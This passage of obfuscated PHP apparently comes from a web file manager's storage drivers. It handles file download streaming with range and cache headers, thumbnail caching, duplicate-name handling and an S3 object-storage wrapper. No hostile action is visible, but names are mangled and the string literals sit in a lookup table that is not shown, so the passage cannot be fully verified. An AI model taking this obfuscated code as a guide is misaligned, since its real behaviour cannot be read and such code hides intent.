link($ò³Á•î´) { return $ò³Á•î´; } public function fileOut($½íåŸ‹¬, $¥„æ‰â„ = false, $™¼Ô¢­Ù = false, $ÊğùÂ – = '') { $ÁíÓ‰³ =& $_SERVER[ùÆÎÔ“Ñ]; $this->cacheMethod(null, null); if (!$½íåŸ‹¬ || !$this->exist($½íåŸ‹¬)) { show_json(LNG($ÁíÓ‰³[105]), !1, $™¼Ô¢­Ù); } $Ë‘®‰ßÍ = $this->getType() == $ÁíÓ‰³[106]; $°öÍ“†õ = $GLOBALS[$ÁíÓ‰³[6]][$ÁíÓ‰³[89]][$ÁíÓ‰³[107]][$ÁíÓ‰³[108]]; $Ş‰Ä’ğ = (double) $GLOBALS[$ÁíÓ‰³[6]][$ÁíÓ‰³[89]][$ÁíÓ‰³[107]][$ÁíÓ‰³[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $ÒÇ÷üî“ = $this->infoFull($½íåŸ‹¬); $ñúƒ°Ãá = $ÒÇ÷üî“[$ÁíÓ‰³[76]]; $ûÑôã = gmdate($ÁíÓ‰³[110], $ÒÇ÷üî“[$ÁíÓ‰³[85]]); $ó‡È·ù¬ = $™¼Ô¢­Ù ? $™¼Ô¢­Ù : $this->iconvApp($ÒÇ÷üî“[$ÁíÓ‰³[32]]); $›à–‘©ô = 0; $”ÉÇÌºÈ = $ñúƒ°Ãá - 1; $×†›ÎÑ = $this->ext($ó‡È·ù¬); if (in_array($×†›ÎÑ, array($ÁíÓ‰³[111], $ÁíÓ‰³[112], $ÁíÓ‰³[113], $ÁíÓ‰³[114]))) { $×†›ÎÑ = $ÁíÓ‰³[115]; } if (in_array($×†›ÎÑ, array($ÁíÓ‰³[116]))) { $×†›ÎÑ = $ÁíÓ‰³[117]; } if (!$ÊğùÂ –) { $ÊğùÂ – = md5($ûÑôã . $this->hashSimple($½íåŸ‹¬)); } $ÊğùÂ – = $ÁíÓ‰³[118] . $ÊğùÂ – . $ÁíÓ‰³[118]; $¨„ğ•µ = get_file_mime($×†›ÎÑ); $ÍĞşš­… = !0; $ÍĞşš­… = isset($_GET[$ÁíÓ‰³[119]]) ? !1 : !0; if ($¥„æ‰â„ === !1 && !mime_support($¨„ğ•µ)) { $¨„ğ•µ = $ÁíÓ‰³[120]; } header($ÁíÓ‰³[121]); header($ÁíÓ‰³[122] . $¨„ğ•µ); $ ¡“«²Ä = rawurlencode($ó‡È·ù¬); $ ¡“«²Ä = $ÁíÓ‰³[118] . $ ¡“«²Ä . $ÁíÓ‰³[123] . $ ¡“«²Ä; if ($¥„æ‰â„) { header($ÁíÓ‰³[124]); header($ÁíÓ‰³[125] . $ ¡“«²Ä); } else { if ($ÍĞşš­…) { header($ÁíÓ‰³[126] . $ ¡“«²Ä); } } header($ÁíÓ‰³[127] . gmdate($ÁíÓ‰³[110], time() + 3600 * 24 * 30) . $ÁíÓ‰³[128]); header($ÁíÓ‰³[129]); header($ÁíÓ‰³[130]); header($ÁíÓ‰³[131]); if (isset($_SERVER[$ÁíÓ‰³[132]]) && strtotime($_SERVER[$ÁíÓ‰³[132]]) == $ÒÇ÷üî“[$ÁíÓ‰³[85]]) { header($ÁíÓ‰³[133], !0, 304); die; } if (isset($_SERVER[$ÁíÓ‰³[134]]) && $_SERVER[$ÁíÓ‰³[134]] == $ÊğùÂ –) { header($ÁíÓ‰³[135] . $ÊğùÂ –, !0, 304); die; } header($ÁíÓ‰³[135] . $ÊğùÂ –); header($ÁíÓ‰³[136] . $ûÑôã . $ÁíÓ‰³[128]); header($ÁíÓ‰³[137] . $ó‡È·ù¬); header($ÁíÓ‰³[138]); header($ÁíÓ‰³[139] . $ñúƒ°Ãá); header($ÁíÓ‰³[140]); if (!$¥„æ‰â„ && $×†›ÎÑ == $ÁíÓ‰³[141]) { if ($ñúƒ°Ãá > 1024 * 1024 * 5) { die; } $öËé³Ç = $this->getContent($½íåŸ‹¬); $öËé³Ç = Html::clearSVG($öËé³Ç); header($ÁíÓ‰³[142] . strlen($öËé³Ç)); echo $öËé³Ç; die; } $Àõì§ = strtolower($_SERVER[$ÁíÓ‰³[143]]); if ($Ë‘®‰ßÍ && $Àõì§ && $°öÍ“†õ) { if (strstr($Àõì§, $ÁíÓ‰³[144])) { header($ÁíÓ‰³[145] . $½íåŸ‹¬); } else { if (strstr($Àõì§, $ÁíÓ‰³[146])) { header($ÁíÓ‰³[147] . $½íåŸ‹¬); } else { if (strstr($Àõì§, $ÁíÓ‰³[148])) { header($ÁíÓ‰³[149] . $½íåŸ‹¬); } } } if ($Ş‰Ä’ğ) { header($ÁíÓ‰³[150] . $Ş‰Ä’ğ); } return; } if (isset($_SERVER[$ÁíÓ‰³[151]])) { if (preg_match($ÁíÓ‰³[152], $_SERVER[$ÁíÓ‰³[151]], $¹‚²©°)) { $›à–‘©ô = intval($¹‚²©°[1]); $›à–‘©ô = $›à–‘©ô <= 0 ? 0 : ($›à–‘©ô >= $”ÉÇÌºÈ ? $”ÉÇÌºÈ : $›à–‘©ô); if (!empty($¹‚²©°[2])) { $Ó“ŒˆÒ¹ = intval($¹‚²©°[2]); $”ÉÇÌºÈ = $Ó“ŒˆÒ¹ < $›à–‘©ô ? $›à–‘©ô : ($Ó“ŒˆÒ¹ >= $”ÉÇÌºÈ ? $”ÉÇÌºÈ : $Ó“ŒˆÒ¹); } } header($ÁíÓ‰³[153]); header("\x43\x6f\156\x74\x65\156\164\x2d\x52\x61\156\x67\145\72\40\x62\171\x74\x65\163\x20{$›à–‘©ô}\55{$”ÉÇÌºÈ}\x2f" . $ñúƒ°Ãá); } else { header($ÁíÓ‰³[154]); } header($ÁíÓ‰³[155]); $º‘ÓÚÉ¼ = !0; if ($_SERVER[$ÁíÓ‰³[156]] == $ÁíÓ‰³[157] && $ñúƒ°Ãá > 1204 * 1024 * 1024 * 2) { $º‘ÓÚÉ¼ = !1; } if ($º‘ÓÚÉ¼) { header($ÁíÓ‰³[158] . ($”ÉÇÌºÈ - $›à–‘©ô + 1)); } if ($_SERVER[$ÁíÓ‰³[159]] == $ÁíÓ‰³[160]) { return; } $·’›îñŠ = 1024 * 100; $ÏŒÖ‡òş = 0; if ($Ş‰Ä’ğ) { $ÏŒÖ‡òş = intval(1000 * 1000 * ($·’›îñŠ / $Ş‰Ä’ğ)); } while ($›à–‘©ô <= $”ÉÇÌºÈ) { $˜ıàšÇ = timeFloat(); check_abort(); $ü••Óô = $”ÉÇÌºÈ - $›à–‘©ô + 1; if ($ü••Óô <= $·’›îñŠ) { $·’›îñŠ = $ü••Óô; } echo $this->fileSubstr($½íåŸ‹¬, $›à–‘©ô, $·’›îñŠ); $›à–‘©ô += $·’›îñŠ; if ($·’›îñŠ == $ü••Óô) { $›à–‘©ô = $”ÉÇÌºÈ + 1; } if ($ÏŒÖ‡òş) { $áŞÒ«ô = intval(1000 * 1000 * (timeFloat() - $˜ıàšÇ)); $™Áó¢Œ´ = $ÏŒÖ‡òş - $áŞÒ«ô; if ($™Áó¢Œ´ > 5) { usleep($™Áó¢Œ´); } } } } public function fileOutServer($Åø›å€, $Ü§›£ = false, $´ÈÜ‚Á¡ = false, $®¤™ˆîê = '') { $this->fileOut($Åø›å€, $Ü§›£, $´ÈÜ‚Á¡, $®¤™ˆîê); } public function fileOutLink($Øµšƒï…) { header($_SERVER[ùÆÎÔ“Ñ][161] . $Øµšƒï…); die; } public function cacheMethod($¥“ç¿ßí, $Œ²€ó·¶, $¡¼¾Áí– = null) { $¾·¦’ù© =& $_SERVER[ùÆÎÔ“Ñ]; static $ÜËÔôö‹ = array(); $ÉÖÔäÎ = $Œ²€ó·¶ ? ltrim($this->getPathOuter($Œ²€ó·¶), $¾·¦’ù©[8]) : $¾·¦’ù©[12]; $ğƒŸĞŠ = $¾·¦’ù©[162] . $¥“ç¿ßí . $¾·¦’ù©[163] . rtrim($ÉÖÔäÎ, $¾·¦’ù©[8]); if (is_null($¥“ç¿ßí)) { $ÜËÔôö‹ = array(); return; } if (is_null($Œ²€ó·¶)) { foreach ($ÜËÔôö‹ as $ğƒŸĞŠ => $­È£×ƒÈ) { if (!strstr($ğƒŸĞŠ, $¾·¦’ù©[162] . $¥“ç¿ßí . $¾·¦’ù©[164])) { continue; } unset($ÜËÔôö‹[$ğƒŸĞŠ]); } return; } if (!is_null($¡¼¾Áí–)) { $ÜËÔôö‹[$ğƒŸĞŠ] = $¡¼¾Áí–; return; } $™ÖÑ´³à = isset($ÜËÔôö‹[$ğƒŸĞŠ]) ? $ÜËÔôö‹[$ğƒŸĞŠ] : null; if (!is_null($™ÖÑ´³à)) { return $™ÖÑ´³à; } $™ÖÑ´³à = $this->{$¥“ç¿ßí}($Œ²€ó·¶); $ÜËÔôö‹[$ğƒŸĞŠ] = $™ÖÑ´³à; return $™ÖÑ´³à; } public function cacheMethodInfoSet($‰Øï²ì, $´Ù€©¯Û, $¦Ëïš×„ = false) { $ õ£ç§À =& $_SERVER[ùÆÎÔ“Ñ]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($ õ£ç§À[165], $‰Øï²ì, $´Ù€©¯Û); $this->cacheMethod($ õ£ç§À[166], $‰Øï²ì, $´Ù€©¯Û ? !1 : !0); if (is_array($¦Ëïš×„)) { $this->cacheMethod($ õ£ç§À[167], $‰Øï²ì, $¦Ëïš×„); } } public function fileOutImage($öÅÀÍå, $ÈÇı‘é = 250) { $«˜Í©Ø’ =& $_SERVER[ùÆÎÔ“Ñ]; set_timeout(); if (substr($öÅÀÍå, 0, 4) == $«˜Í©Ø’[148]) { $this->fileOutLink($öÅÀÍå); } $£çíø¾ = $this->info($öÅÀÍå); $©¼‘Í° = $£çíø¾[$«˜Í©Ø’[32]]; $ğÓÒûï = !1; if (isset($GLOBALS[$«˜Í©Ø’[168]]) && $GLOBALS[$«˜Í©Ø’[168]][$«˜Í©Ø’[84]] == $£çíø¾[$«˜Í©Ø’[84]]) { $ùŞ€å§‹ = $GLOBALS[$«˜Í©Ø’[168]][$«˜Í©Ø’[169]]; if (!$£çíø¾[$«˜Í©Ø’[170]]) { $£çíø¾[$«˜Í©Ø’[170]] = $GLOBALS[$«˜Í©Ø’[168]]; } if (isset($ùŞ€å§‹[$«˜Í©Ø’[171]])) { if ($ùŞ€å§‹[$«˜Í©Ø’[171]] <= $ÈÇı‘é && $ùŞ€å§‹[$«˜Í©Ø’[172]] <= $ÈÇı‘é) { $ğÓÒûï = !0; } } $©¼‘Í° = $£çíø¾[$«˜Í©Ø’[170]][$«˜Í©Ø’[32]]; } if ($£çíø¾[$«˜Í©Ø’[76]] <= 1024 * 50 || $ğÓÒûï || !function_exists($«˜Í©Ø’[173]) || $£çíø¾[$«˜Í©Ø’[174]] == $«˜Í©Ø’[175]) { return $this->fileOut($öÅÀÍå, !1, $©¼‘Í°); } if (isset($£çíø¾[$«˜Í©Ø’[170]][$«˜Í©Ø’[176]])) { $ş¦ÚœÜò = $£çíø¾[$«˜Í©Ø’[170]][$«˜Í©Ø’[176]]; } else { if (isset($£çíø¾[$«˜Í©Ø’[170]][$«˜Í©Ø’[177]])) { $ş¦ÚœÜò = $£çíø¾[$«˜Í©Ø’[170]][$«˜Í©Ø’[177]]; } } if (!$ş¦ÚœÜò) { $ş¦ÚœÜò = md5("{$£çíø¾[$«˜Í©Ø’[32]]}\137{$£çíø¾[$«˜Í©Ø’[84]]}\x5f{$£çíø¾[$«˜Í©Ø’[76]]}\137{$ÈÇı‘é}"); } $šÒ×Œš¥ = "{$ş¦ÚœÜò}\137{$ÈÇı‘é}\56\160\x6e\x67"; if (!($’³€Å‰¦ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $«˜Í©Ø’[178]))) { $½¼Óˆ¯Æ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $«˜Í©Ø’[179]); } else { $½¼Óˆ¯Æ = KodIO::make($’³€Å‰¦); } if ($’³€Å‰¦ = IO::fileNameExist($½¼Óˆ¯Æ, $šÒ×Œš¥)) { $©éƒ©Àù = KodIO::make($’³€Å‰¦); return IO::fileOut($©éƒ©Àù, !1, $©¼‘Í°); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $©éƒ©Àù = DATA_THUMB . $šÒ×Œš¥; del_file($©éƒ©Àù); if (!@file_exists($©éƒ©Àù)) { $—£¸—Å¸ = TEMP_FILES; if (!is_dir($—£¸—Å¸)) { mk_dir($—£¸—Å¸); } $ ß‘ÚÌÛ = $—£¸—Å¸ . $ş¦ÚœÜò . $«˜Í©Ø’[10] . $£çíø¾[$«˜Í©Ø’[174]]; if (!@file_exists($ ß‘ÚÌÛ)) { $ ß‘ÚÌÛ = $this->download($öÅÀÍå, $ ß‘ÚÌÛ); } ImageThumb::createThumb($ ß‘ÚÌÛ, $©éƒ©Àù, $ÈÇı‘é, $ÈÇı‘é * 10); } if (!file_exists($©éƒ©Àù) || filesize($©éƒ©Àù) < 100) { return @file_exists($ ß‘ÚÌÛ) ? IO::fileOut($ ß‘ÚÌÛ) : $this->fileOut($öÅÀÍå); } if (!($ˆøã±‚’ = IO::move($©éƒ©Àù, $½¼Óˆ¯Æ))) { return IO::fileOut($©éƒ©Àù); } del_file($©éƒ©Àù); IO::fileOut($ˆøã±‚’); } public function fileOutImageServer($ÔåÚÍ¥, $‘×ÄŞÃ¾ = 250) { $this->fileOutImage($ÔåÚÍ¥, $‘×ÄŞÃ¾); } public function fileNameAuto($ŒÁ‹ÊÀ‘, $­‡ááƒ©, $¥øÃĞ‡ = REPEAT_RENAME, $Ôà†¢Ö = false) { $á“‰ğëİ =& $_SERVER[ùÆÎÔ“Ñ]; $¾Ü¿•™Ï = $ŒÁ‹ÊÀ‘ === $á“‰ğëİ[12] ? $­‡ááƒ© : rtrim($ŒÁ‹ÊÀ‘, $á“‰ğëİ[8]) . $á“‰ğëİ[8] . $­‡ááƒ©; if ($¥øÃĞ‡ == REPEAT_REPLACE || !$this->exist($¾Ü¿•™Ï) || $Ôà†¢Ö && $¥øÃĞ‡ != REPEAT_RENAME_FOLDER) { return $­‡ááƒ©; } if ($¥øÃĞ‡ == REPEAT_SKIP) { return !1; } $Úöµ¨ÊÛ = $á“‰ğëİ[10] . get_path_ext($­‡ááƒ©); $Úöµ¨ÊÛ = $Úöµ¨ÊÛ == $á“‰ğëİ[10] || $Ôà†¢Ö ? $á“‰ğëİ[12] : $Úöµ¨ÊÛ; $½•›Ÿù = 1; $ò˜Óéª¨ = substr($­‡ááƒ©, 0, strlen($­‡ááƒ©) - strlen($Úöµ¨ÊÛ)); $‘£¼„Û = $ò˜Óéª¨ . "\x28{$½•›Ÿù}\x29{$Úöµ¨ÊÛ}"; while ($this->exist(rtrim($ŒÁ‹ÊÀ‘, $á“‰ğëİ[8]) . $á“‰ğëİ[8] . $‘£¼„Û)) { $‘£¼„Û = $ò˜Óéª¨ . "\50{$½•›Ÿù}\x29{$Úöµ¨ÊÛ}"; $½•›Ÿù++; } return $‘£¼„Û; } private function fileNameAutoList($­Ğú³êú, $¦ªŒØäÏ, $öÂ÷Œé = false) { $¯íóß®ƒ =& $_SERVER[ùÆÎÔ“Ñ]; $«×åçƒ÷ = $this->listPath($­Ğú³êú, !0); $«×åçƒ÷ = array_merge($«×åçƒ÷[$¯íóß®ƒ[82]], $«×åçƒ÷[$¯íóß®ƒ[83]]); $ë°‡şç = array_to_keyvalue($«×åçƒ÷, $¯íóß®ƒ[12], $¯íóß®ƒ[32]); $èºÊßÂ = $¯íóß®ƒ[10] . get_path_ext($¦ªŒØäÏ); $èºÊßÂ = $èºÊßÂ == $¯íóß®ƒ[10] || $öÂ÷Œé ? $¯íóß®ƒ[12] : $èºÊßÂ; $Ğş©ÖÈƒ = substr($¦ªŒØäÏ, 0, strlen($¦ªŒØäÏ) - strlen($èºÊßÂ)); $²ÌÃ÷¡‰ = $Ğş©ÖÈƒ . "\x28\x30\51{$èºÊßÂ}"; for ($ºàñ¡î = 1; $ºàñ¡î <= count($ë°‡şç) + 1; $ºàñ¡î++) { $²ÌÃ÷¡‰ = $Ğş©ÖÈƒ . "\50{$ºàñ¡î}\51{$èºÊßÂ}"; if (!in_array_not_case($²ÌÃ÷¡‰, $ë°‡şç)) { return $²ÌÃ÷¡‰; } } return $²ÌÃ÷¡‰; } public function listAllFiles($áÑ½¶ô, $ñ‹¼¨É, $¿Íº˜„„ = array()) { $ˆß¨Æ€¿ =& $_SERVER[ùÆÎÔ“Ñ]; if (empty($ñ‹¼¨É)) { return array(); } $³Ó±àËá = array(); $áÑ½¶ô = trim($áÑ½¶ô, $ˆß¨Æ€¿[8]); foreach ($ñ‹¼¨É as $½É¯­²¬) { $ƒ¢÷Œ = ltrim(substr(trim($½É¯­²¬, $ˆß¨Æ€¿[8]), strlen($áÑ½¶ô)), $ˆß¨Æ€¿[8]); $³Ó±àËá = array_merge($³Ó±àËá, $this->slicePath($ƒ¢÷Œ)); } $²é–è±• = array(); foreach (array_unique($³Ó±àËá) as $½É¯­²¬) { $‚Ä Ÿ» = array($ˆß¨Æ€¿[84] => $this->getPathOuter($ˆß¨Æ€¿[8] . $áÑ½¶ô . $ˆß¨Æ€¿[8] . $½É¯­²¬), $ˆß¨Æ€¿[75] => 1, $ˆß¨Æ€¿[76] => 0); if (substr($½É¯­²¬, -1) != $ˆß¨Æ€¿[8]) { $‚Ä Ÿ»[$ˆß¨Æ€¿[75]] = 0; $¨ôÒŠ€¤ = $this->getPath($áÑ½¶ô . $ˆß¨Æ€¿[8] . $½É¯­²¬); $‚Ä Ÿ»[$ˆß¨Æ€¿[76]] = isset($¿Íº˜„„[$¨ôÒŠ€¤]) ? $¿Íº˜„„[$¨ôÒŠ€¤] : $this->size($¨ôÒŠ€¤); } $²é–è±•[] = $‚Ä Ÿ»; } return $²é–è±•; } public function slicePath($äÏÇ®“ô) { $ïä£ş±¥ =& $_SERVER[ùÆÎÔ“Ñ]; $ñ·ô¤¡Ñ = explode($ïä£ş±¥[8], trim($äÏÇ®“ô, $ïä£ş±¥[8])); $¥Š¦Ëª£ = 0; do { ++$¥Š¦Ëª£; $ë›©„‰Ú[] = implode($ïä£ş±¥[8], array_slice($ñ·ô¤¡Ñ, 0, $¥Š¦Ëª£)) . $ïä£ş±¥[8]; } while ($¥Š¦Ëª£ < count($ñ·ô¤¡Ñ)); $ë›©„‰Ú[count($ñ·ô¤¡Ñ) - 1] = $äÏÇ®“ô; return $ë›©„‰Ú; } public function getHost() { $ïÃ©åè» =& $_SERVER[ùÆÎÔ“Ñ]; $Õ†«î— = parse_url(trim($this->domain, $ïÃ©åè»[8])); $¤‚º¹‰ = isset($Õ†«î—[$ïÃ©åè»[180]]) ? $Õ†«î—[$ïÃ©åè»[180]] : http_type(); $òÛß¯Éæ = isset($Õ†«î—[$ïÃ©åè»[181]]) ? $Õ†«î—[$ïÃ©åè»[181]] : $Õ†«î—[$ïÃ©åè»[84]]; if (isset($Õ†«î—[$ïÃ©åè»[182]])) { $òÛß¯Éæ .= $ïÃ©åè»[4] . $Õ†«î—[$ïÃ©åè»[182]]; } return $¤‚º¹‰ . $ïÃ©åè»[183] . $òÛß¯Éæ; } public function pathEncode($•ÖØ‰Ÿ) { $ˆØ€Áæ— =& $_SERVER[ùÆÎÔ“Ñ]; return str_replace($ˆØ€Áæ—[184], $ˆØ€Áæ—[8], rawurlencode($•ÖØ‰Ÿ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($÷Øæ°³ø) { set_timeout(); require_once SDK_DIR . $_SERVER[ùÆÎÔ“Ñ][185]; parent::__construct(); $this->_init($÷Øæ°³ø); } public function _init($™“›æ) { foreach ($™“›æ as $ÑµÔ Àï => $¯–¤ÁÒ) { if (isset($this->{$ÑµÔ Àï})) { $this->{$ÑµÔ Àï} = $¯–¤ÁÒ; } } $this->endpoint = $™“›æ[$_SERVER[ùÆÎÔ“Ñ][186]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($„Â”ÏÇ™ = "\166\64") { $this->signVer = $„Â”ÏÇ™; $this->client->setSignatureVersion($„Â”ÏÇ™); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $­Ó€Š€‚ =& $_SERVER[ùÆÎÔ“Ñ]; $îÀà›ú¦ = $this->getBucketCors(); if (!$îÀà›ú¦ || !is_array($îÀà›ú¦)) { return !1; } if ($îÀà›ú¦[$­Ó€Š€‚[187]] != $­Ó€Š€‚[188] || $îÀà›ú¦[$­Ó€Š€‚[189]] != $­Ó€Š€‚[188]) { return !1; } $Øö£™›Â = array_map($­Ó€Š€‚[190], $îÀà›ú¦[$­Ó€Š€‚[191]]); if (!is_array($Øö£™›Â)) { $Øö£™›Â = array(); } $…ë›Ÿôî = array($­Ó€Š€‚[192], $­Ó€Š€‚[193], $­Ó€Š€‚[194], $­Ó€Š€‚[195], $­Ó€Š€‚[196]); $Šñ¯öíÖ = array_diff($…ë›Ÿôî, $Øö£™›Â); return empty($Šñ¯öíÖ); } public function mkfile($¶Ò¹ô˜å, $·¦Êƒàô = '', $ÙÈ¦½‹Ã = REPEAT_RENAME) { $úˆçèí = $this->setContent($¶Ò¹ô˜å, $·¦Êƒàô); if ($úˆçèí !== !1) { return $this->getPathOuter($¶Ò¹ô˜å); } return !1; } public function mkdir($Ğâ¾„“¸, $ˆ©ìş’Ø = REPEAT_SKIP) { $½Ø¬­‰ =& $_SERVER[ùÆÎÔ“Ñ]; if (empty($Ğâ¾„“¸) && $Ğâ¾„“¸ !== $½Ø¬­‰[197]) { return !1; } if ($ˆ©ìş’Ø && $this->_isFolder($Ğâ¾„“¸)) { return $this->getPathOuter($Ğâ¾„“¸); } $ı‚€Ó¤‚ = $this->setContent($Ğâ¾„“¸, $½Ø¬­‰[12], !0); if ($ı‚€Ó¤‚ !== !1) { return $this->getPathOuter($Ğâ¾„“¸); } return !1; } public function copyFile($áªáî´Ö, $ŒÅí—Ù¡, $•ŒÔÀô– = array()) { $—ª¿ÂÃñ =& $_SERVER[ùÆÎÔ“Ñ]; $ Ÿá»˜¬ = $this->objectMeta($áªáî´Ö); if (!$ Ÿá»˜¬) { return !1; } if ($ Ÿá»˜¬[$—ª¿ÂÃñ[76]] <= 1024 * 1024 * 200) { $İ³İ°’ = $this->client->copyObject($this->bucket, $áªáî´Ö, $this->bucket, $ŒÅí—Ù¡, $—ª¿ÂÃñ[198], $•ŒÔÀô–); } else { $İ³İ°’ = $this->client->multiCopyObject($this->bucket, $áªáî´Ö, $this->bucket, $ŒÅí—Ù¡, $•ŒÔÀô–); } $İ³İ°’ = $İ³İ°’ ? $this->getPathOuter($ŒÅí—Ù¡) : !1; return $İ³İ°’; } public function moveFile($õ÷Û°¼Ì, $ÅğŸŞÏÛ) { if ($this->copyFile($õ÷Û°¼Ì, $ÅğŸŞÏÛ)) { $this->delFile($õ÷Û°¼Ì); return $this->getPathOuter($ÅğŸŞÏÛ); } return !1; } public function delFile($Ì¯øüûœ) { return $this->client->deleteObject($this->bucket, $Ì¯øüûœ); } public function delFolder($¦ÕÈ¡‘İ) { $öÚ©ã‚ˆ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$this->exist($¦ÕÈ¡‘İ)) { return !0; } $this->listItemCache = !1; $¥²çŸº¥ = $this->fileList($¦ÕÈ¡‘İ); $this->listItemCache = !0; $Üë¬àª¡ = trim($¦ÕÈ¡‘İ, $öÚ©ã‚ˆ[8]) . $öÚ©ã‚ˆ[8]; if (!empty($¦ÕÈ¡‘İ) && $¦ÕÈ¡‘İ !== $öÚ©ã‚ˆ[197] && !in_array($Üë¬àª¡, $¥²çŸº¥[$öÚ©ã‚ˆ[82]])) { $¥²çŸº¥[$öÚ©ã‚ˆ[82]][] = $Üë¬àª¡; } $ô÷Ñ°â = $this->delByBatch($¥²çŸº¥[$öÚ©ã‚ˆ[83]]); if (!$ô÷Ñ°â) { return !1; } $ô÷Ñ°â = $this->delByBatch($¥²çŸº¥[$öÚ©ã‚ˆ[82]]); if (!$ô÷Ñ°â) { return !1; } return $this->delFile($Üë¬àª¡); } private function delByBatch($§¬”ºµ€) { foreach (array_chunk($§¬”ºµ€, 1000) as $İ››Šı) { $ú§‘€á = $this->client->deleteObjects($this->bucket, $İ››Šı); if (!$ú§‘€á) { return !1; } } return !0; } public function rename($…ÆŠïÃ€, $Ú±öíé¸) { return $this->renameObject($…ÆŠïÃ€, $Ú±öíé¸); } public function listPath($Ïğ–­Ô¥, $œÌá­Ë = false) { $ğ›Ÿ…ğ¬ =& $_SERVER[ùÆÎÔ“Ñ]; $ş™Ëğğö = $this->fileList($Ïğ–­Ô¥, $ğ›Ÿ…ğ¬[8], !0); foreach ($ş™Ëğğö[$ğ›Ÿ…ğ¬[82]] as $ŞæÙÓ¡ğ => $©Üù…Ë¸) { $ş™Ëğğö[$ğ›Ÿ…ğ¬[82]][$ŞæÙÓ¡ğ] = $this->folderInfo($©Üù…Ë¸, $œÌá­Ë, $©Üù…Ë¸); } foreach ($ş™Ëğğö[$ğ›Ÿ…ğ¬[83]] as $ŞæÙÓ¡ğ => $©Üù…Ë¸) { $ş™Ëğğö[$ğ›Ÿ…ğ¬[83]][$ŞæÙÓ¡ğ] = $this->fileInfo($©Üù…Ë¸[$ğ›Ÿ…ğ¬[32]], $œÌá­Ë, $©Üù…Ë¸); } return $ş™Ëğğö; } protected function infoChildren($¤°‹ßƒ, &$İ’÷®ì) { $ÅË…¨ =& $_SERVER[ùÆÎÔ“Ñ]; $ÀÙ¾ Œ¦ = $this->fileList($¤°‹ßƒ, $ÅË…¨[12], !0); $İ’÷®ì[$ÅË…¨[78]] += count($ÀÙ¾ Œ¦[$ÅË…¨[82]]); $İ’÷®ì[$ÅË…¨[77]] += count($ÀÙ¾ Œ¦[$ÅË…¨[83]]); foreach ($ÀÙ¾ Œ¦[$ÅË…¨[83]] as $³Èó‘ŞÒ) { if (!$³Èó‘ŞÒ || !$³Èó‘ŞÒ[$ÅË…¨[76]]) { continue; } $İ’÷®ì[$ÅË…¨[76]] += $³Èó‘ŞÒ[$ÅË…¨[76]]; } } private function fileInfo($—¶Ëñé, $º©Éã‹œ = false, $Ëü³“ì = array()) { $ÄÙ­­ö¥ =& $_SERVER[ùÆÎÔ“Ñ]; $±íÙ·º = array($ÄÙ­­ö¥[32] => $this->pathThis($—¶Ëñé), $ÄÙ­­ö¥[84] => $this->getPathOuter($—¶Ëñé), $ÄÙ­­ö¥[33] => $ÄÙ­­ö¥[199], $ÄÙ­­ö¥[174] => $this->ext($—¶Ëñé), $ÄÙ­­ö¥[76] => isset($Ëü³“ì[$ÄÙ­­ö¥[76]]) ? $Ëü³“ì[$ÄÙ­­ö¥[76]] : 0); if ($º©Éã‹œ) { return $±íÙ·º; } $±íÙ·º[$ÄÙ­­ö¥[200]] = $±íÙ·º[$ÄÙ­­ö¥[85]] = 0; $±íÙ·º[$ÄÙ­­ö¥[201]] = $±íÙ·º[$ÄÙ­­ö¥[202]] = !0; if (empty($Ëü³“ì)) { $Ëü³“ì = $this->objectMeta($—¶Ëñé); if (!$Ëü³“ì) { return $±íÙ·º; } } if (isset($Ëü³“ì[$ÄÙ­­ö¥[203]])) { $±íÙ·º[$ÄÙ­­ö¥[85]] = $Ëü³“ì[$ÄÙ­­ö¥[203]]; } if (isset($Ëü³“ì[$ÄÙ­­ö¥[76]])) { $±íÙ·º[$ÄÙ­­ö¥[76]] = $Ëü³“ì[$ÄÙ­­ö¥[76]]; } return $±íÙ·º; } private function folderInfo($Í´ßè·, $ß³’¹İâ = false, $”ÙÇÅ = array()) { $Êã¢œŒ‚ =& $_SERVER[ùÆÎÔ“Ñ]; $Ïè­ÎÇä = array($Êã¢œŒ‚[32] => $this->pathThis($Í´ßè·), $Êã¢œŒ‚[84] => $this->getPathOuter($Êã¢œŒ‚[8] . $Í´ßè·), $Êã¢œŒ‚[33] => $Êã¢œŒ‚[75]); if ($ß³’¹İâ) { return $Ïè­ÎÇä; } $Ïè­ÎÇä[$Êã¢œŒ‚[200]] = $Ïè­ÎÇä[$Êã¢œŒ‚[85]] = 0; $Ïè­ÎÇä[$Êã¢œŒ‚[201]] = $Ïè­ÎÇä[$Êã¢œŒ‚[202]] = !0; if ($Í´ßè· == $Êã¢œŒ‚[12]) { return $Ïè­ÎÇä; } if (empty($”ÙÇÅ)) { $”ÙÇÅ = $this->objectMeta(trim($Í´ßè·, $Êã¢œŒ‚[8]) . $Êã¢œŒ‚[8]); } if (isset($”ÙÇÅ[$Êã¢œŒ‚[203]])) { $Ïè­ÎÇä[$Êã¢œŒ‚[200]] = $”ÙÇÅ[$Êã¢œŒ‚[203]]; } return $Ïè­ÎÇä; } private function fileList($ŞĞä‘ö, $•Á²ó‚­ = '', $úÙ¦œú† = 0) { $´ßåÑìÉ =& $_SERVER[ùÆÎÔ“Ñ]; $Í÷ŠñŒ½ = rtrim($ŞĞä‘ö, $´ßåÑìÉ[8]) . $´ßåÑìÉ[8]; $Ş»ƒî–Š = $this->listObjs($Í÷ŠñŒ½, null, null, $•Á²ó‚­); if (!$Ş»ƒî–Š) { return array($´ßåÑìÉ[82] => array(), $´ßåÑìÉ[83] => array()); } $ÁÚ£Èü¤ = $ÙšÙ‚³¼ = array(); foreach ($Ş»ƒî–Š[$´ßåÑìÉ[204]] as $×¿Äğç½) { $æÊ¨òúù = $×¿Äğç½[$´ßåÑìÉ[32]]; if ($æÊ¨òúù == 